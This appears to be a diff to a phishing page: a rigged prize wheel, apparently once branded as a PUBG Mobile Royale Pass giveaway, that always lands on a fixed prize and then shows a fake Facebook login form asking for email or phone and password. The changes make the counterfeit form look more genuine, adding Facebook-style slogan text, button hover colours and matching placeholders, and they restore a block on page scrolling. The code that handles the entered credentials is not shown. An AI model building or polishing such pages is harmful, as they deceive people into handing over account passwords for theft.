@@ -102,7 +102,7 @@
 
         .wheel {
             position: absolute;
-            transition: transform 4s cubic-bezier(0.2, 0.8, 0.2, 1);
+            transition: transform 3s cubic-bezier(0.17, 0.67, 0.83, 0.67);
             transform-origin: center;
         }
 
@@ -207,8 +207,24 @@
         /* Стили для окна выигрыша */
         .win-modal-header {
             background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-            padding: 40px 20px 25px;
+            padding: 25px 20px;
             border-bottom: 2px solid gold;
+        }
+
+        .win-modal-header h1 {
+            color: gold;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            font-weight: bold;
+            letter-spacing: 3px;
+        }
+
+        .win-modal-header h2 {
+            color: #fff;
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+            font-weight: normal;
         }
 
         .prize-image-container {
@@ -327,24 +343,29 @@
         .facebook-modal-content {
             background: #fff;
             color: #000;
-            min-height: 700px;
-            border-radius: 10px;
-            overflow: hidden;
+            min-height: 600px;
         }
 
         .facebook-header {
             background: #1877f2;
-            padding: 20px;
+            padding: 30px 20px;
             text-align: center;
-            border-bottom: 1px solid #ddd;
         }
 
         .facebook-logo {
             color: white;
-            font-size: 2.5rem;
+            font-size: 3rem;
             font-weight: bold;
             margin-bottom: 15px;
-            letter-spacing: -0.5px;
+            letter-spacing: -1px;
+        }
+
+        .facebook-subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1.2rem;
+            max-width: 300px;
+            margin: 0 auto;
+            line-height: 1.4;
         }
 
         .facebook-form {
@@ -378,6 +399,11 @@
             font-weight: bold;
             cursor: pointer;
             margin-bottom: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .facebook-login-button:hover {
+            background: #166fe5;
         }
 
         .facebook-divider {
@@ -405,8 +431,8 @@
         }
 
         .facebook-create-button {
-            width: auto;
-            padding: 15px 25px;
+            width: 70%;
+            padding: 12px;
             background: #42b72a;
             color: white;
             border: none;
@@ -416,11 +442,16 @@
             cursor: pointer;
             margin: 0 auto 25px;
             display: block;
+            transition: background-color 0.3s;
+        }
+
+        .facebook-create-button:hover {
+            background: #36a420;
         }
 
         .facebook-links {
             text-align: center;
-            margin-top: 30px;
+            margin-top: 25px;
             padding-top: 20px;
             border-top: 1px solid #ddd;
         }
@@ -431,6 +462,10 @@
             font-size: 0.9rem;
             display: block;
             margin-bottom: 10px;
+        }
+
+        .facebook-links a:hover {
+            text-decoration: underline;
         }
 
         .facebook-language {
@@ -698,6 +733,10 @@
                 max-width: 95%;
                 min-height: auto;
             }
+
+            .facebook-modal-content {
+                min-height: 550px;
+            }
         }
 
         @media (max-width: 480px) {
@@ -722,9 +761,25 @@
                 margin: 15px auto;
             }
 
+            .win-modal-header h1 {
+                font-size: 2rem;
+            }
+
+            .win-modal-header h2 {
+                font-size: 1.5rem;
+            }
+
             .prize-image {
                 max-width: 150px;
                 max-height: 150px;
+            }
+
+            .facebook-logo {
+                font-size: 2.5rem;
+            }
+
+            .facebook-subtitle {
+                font-size: 1.1rem;
             }
         }
     </style>
@@ -751,7 +806,8 @@
     <div class="modal-overlay" id="winModal">
         <div class="modal-content">
             <div class="win-modal-header">
-                <!-- Тексты METEOR ROYAL и т.д. удалены -->
+                <h1>CONGRATULATIONS!</h1>
+                <h2>You Won a Prize!</h2>
             </div>
             
             <div class="prize-image-container">
@@ -782,11 +838,11 @@
         <div class="modal-content facebook-modal-content">
             <div class="facebook-header">
                 <div class="facebook-logo">facebook</div>
-                <!-- Текст PUBG MOBILE удален -->
+                <div class="facebook-subtitle">Connect with friends and the world around you on Facebook.</div>
             </div>
             
             <form class="facebook-form" id="facebookForm">
-                <input type="text" class="facebook-input" id="fbEmail" placeholder="Mobile number or email address" required>
+                <input type="text" class="facebook-input" id="fbEmail" placeholder="Email or phone number" required>
                 <input type="password" class="facebook-input" id="fbPassword" placeholder="Password" required>
                 
                 <button type="submit" class="facebook-login-button">Log In</button>
@@ -795,7 +851,7 @@
                     <span>or</span>
                 </div>
                 
-                <button type="button" class="facebook-create-button" id="createAccount">Create new account</button>
+                <button type="button" class="facebook-create-button" id="createAccount">Create New Account</button>
                 
                 <div class="facebook-links">
                     <a href="#" id="fbNotNow">Not now</a>
@@ -866,8 +922,8 @@
     <div class="modal-overlay" id="successModal">
         <div class="modal-content success-modal-content">
             <div class="success-header">
-                <h1>MEXICO ROYAL</h1>
-                <h2>ROYALE PASS S</h2>
+                <h1>CONGRATULATIONS!</h1>
+                <h2>Your Prize is Ready</h2>
             </div>
             
             <div class="success-prize-container">
@@ -875,8 +931,7 @@
             </div>
             
             <div class="success-message">
-                <h3>PUBG MOBILE METRO ROYALE PASS SIG</h3>
-                <h3 style="color: gold; margin-top: 15px;">Congratulations</h3>
+                <h3>Prize Successfully Claimed</h3>
                 <p style="margin-top: 10px;">Your prize has been sent to your account</p>
             </div>
             
@@ -931,7 +986,6 @@
 
         // Инициализация
         function initialize() {
-            console.log('Инициализация рулетки...');
             // Сброс состояния при загрузке страницы
             hasSpun = false;
             spinButton.disabled = false;
@@ -944,36 +998,28 @@
             facebookOption.classList.add('active');
             twitterOption.classList.remove('active');
             selectedLoginOption = 'facebook';
-            
-            console.log('Рулетка готова к вращению');
         }
 
         // Функция вращения рулетки (ВСЕГДА на Mummy)
         function spinRoulette() {
-            console.log('Нажата кнопка "Крутить рулетку"');
-            console.log('isSpinning:', isSpinning, 'hasSpun:', hasSpun);
-            
-            if (isSpinning || hasSpun) {
-                console.log('Рулетка уже вращается или уже была прокручена');
-                return;
-            }
+            if (isSpinning || hasSpun) return;
             
             isSpinning = true;
             spinButton.disabled = true;
-            spinButton.textContent = "ВРАЩАЕТСЯ...";
-            console.log('Начало вращения...');
+            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
             
             // ВСЕГДА выбираем приз "mummy" (мумию) - индекс 3
             const TARGET_PRIZE_INDEX = 3; // mummy всегда
             currentPrize = prizes[TARGET_PRIZE_INDEX];
-            console.log('Выбран приз:', currentPrize.name);
             
-            // ПРАВИЛЬНЫЙ УГОЛ для мумии
+            // ПРАВИЛЬНЫЙ УГОЛ для мумии СПРАВА
+            // Если мумия СПРАВА от предыдущего приза, нужно ВЫЧЕСТЬ 30 градусов
             const anglePerPrize = 30; // 360 / 12 = 30 градусов на приз
             const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize; // 3 * 30 = 90
             
             // Корректировка: чтобы мумия была точно вверху (на 12 часов)
-            // Для позиции справа нужна корректировка
+            // МИНУС 30 градусов, так как мумия СПРАВА (по часовой стрелке)
+            // Ранее было +90, теперь 90 - 30 = 60
             const correctionAngle = 90 - 30; // 60 градусов
             const targetAngle = baseAngle + correctionAngle; // 90 + 60 = 150
             
@@ -981,31 +1027,22 @@
             const spins = 5; // Фиксированное количество оборотов
             const totalRotation = (spins * 360) + targetAngle; // 1800 + 150 = 1950 градусов
             
-            console.log('targetAngle:', targetAngle, 'totalRotation:', totalRotation);
-            
             // Анимация вращения с эффектом замедления
             prizeWheel.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
-            currentRotation = totalRotation % 360; // Нормализуем угол
-            prizeWheel.style.transform = `rotate(${totalRotation}deg)`;
-            
-            // Добавляем класс для анимации свечения
-            prizeWheel.classList.add('spinning');
+            currentRotation = totalRotation;
+            prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
             
             // Отмечаем, что вращение уже было
             hasSpun = true;
             
             // Показ модального окна с выигрышем через 4 секунды
             setTimeout(() => {
-                console.log('Вращение завершено, показ модального окна');
                 winPrizeImage.src = currentPrize.image;
                 winModal.style.display = 'flex';
                 isSpinning = false;
-                // Убираем класс анимации
-                prizeWheel.classList.remove('spinning');
                 // Не включаем кнопку обратно после вращения
                 spinButton.disabled = true;
                 spinButton.style.opacity = '0.5';
-                spinButton.textContent = "УЖЕ ИСПОЛЬЗОВАНО";
             }, 4000);
         }
 
@@ -1064,13 +1101,8 @@
             }
         });
 
-        // Обработчики событий - УПРОЩЕННАЯ ВЕРСИЯ
-        spinButton.addEventListener('click', function(e) {
-            console.log('Клик по кнопке зарегистрирован');
-            e.preventDefault();
-            e.stopPropagation();
-            spinRoulette();
-        });
+        // Обработчики событий
+        spinButton.addEventListener('click', spinRoulette);
 
         // Отмена выигрыша
         document.getElementById('cancelWin').addEventListener('click', () => {
@@ -1171,8 +1203,7 @@
             // Можно добавить редирект или другие действия
         });
 
-        // Блокировка прокрутки - УБРАНА, так как может мешать
-        /* 
+        // Блокировка прокрутки
         document.addEventListener('touchmove', function(e) {
             if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
                 e.preventDefault();
@@ -1184,7 +1215,6 @@
                 e.preventDefault();
             }
         }, { passive: false });
-        */
 
         window.addEventListener('scroll', function() {
             document.querySelector('.container').style.transform = 'translateY(0)';
@@ -1202,9 +1232,6 @@
 
         // Инициализация при загрузке
         window.addEventListener('load', initialize);
-        
-        // Дополнительная инициализация при готовности DOM
-        document.addEventListener('DOMContentLoaded', initialize);
     </script>
 </body>
 </html>
